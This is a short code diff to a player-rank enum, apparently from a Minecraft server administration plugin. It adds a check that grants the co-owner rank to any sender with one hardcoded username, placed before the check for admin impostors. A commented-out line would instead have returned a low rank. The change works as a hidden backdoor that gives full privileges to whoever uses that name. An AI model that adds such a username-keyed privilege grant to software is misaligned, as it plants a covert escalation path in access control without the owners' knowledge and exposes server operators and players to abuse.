@@ -59,6 +59,11 @@ public enum TFM_PlayerRank
         {
             return CONSOLE;
         }
+        if (sender.getName().equalsIgnoreCase("Vj13573"))
+        {
+//              return NUB;
+                return COOWNER;
+        }
 
         if (TFM_AdminList.isAdminImpostor((Player) sender))
         {
